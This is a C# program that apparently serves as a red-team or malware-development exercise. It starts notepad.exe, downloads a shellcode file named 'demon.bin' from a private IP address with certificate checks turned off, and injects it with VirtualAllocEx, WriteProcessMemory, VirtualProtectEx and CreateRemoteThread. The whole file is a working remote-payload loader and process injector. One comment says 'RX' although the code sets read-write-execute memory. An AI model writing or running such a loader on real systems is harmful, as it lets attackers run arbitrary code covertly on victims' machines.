using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading.Tasks;
using static CreateRemoteThread.Win32;

namespace CreateRemoteThread
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new PROCESS_INFORMATION();

            var success = Win32.CreateProcessW(
                "C:\\Windows\\System32\\notepad.exe",
                null,
                ref pa,
                ref ta,
                false,
                0,
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            if (success)
                Console.WriteLine("Process created with PID: {0}", pi.dwProcessId);
            else
                Console.WriteLine("Failed to create process. Error code: {0}.", Marshal.GetLastWin32Error());

            // Open handle to process
            var process = Process.GetProcessById(pi.dwProcessId);
            Console.WriteLine("Target Handle: 0x{0:X}", process.Handle.ToInt64());

            // Fetch shellcode
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://192.168.231.128:9090/demon.bin");
                }
            }

            // Allocate a region of memory
            var baseAddress = Win32.VirtualAllocEx(
                process.Handle,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            Console.WriteLine("Base Address: 0x{0:x}", baseAddress);

            // Write shellcode into region
            Win32.WriteProcessMemory(
                process.Handle,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Console.WriteLine("Shellcode Injected!");

            // Flip memory region to RX
            Win32.VirtualProtectEx(
                process.Handle,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteReadWrite,
                out _);

            Console.WriteLine("Flipping Memory Protection!");

            // Create the new thread
            try
            {
                Win32.CreateRemoteThread(
                    process.Handle,
                    IntPtr.Zero,
                    0,
                    baseAddress,
                    IntPtr.Zero,
                    0,
                    out _);
            }
            catch
            {
                Console.WriteLine("Failed to inject shellcode. Error code: {0}.", Marshal.GetLastWin32Error());
            }

            // Shellcode is runing in a remote process
            // no need to stop this process from closing

            Console.WriteLine("Shellcode Executed!");
        }
    }
}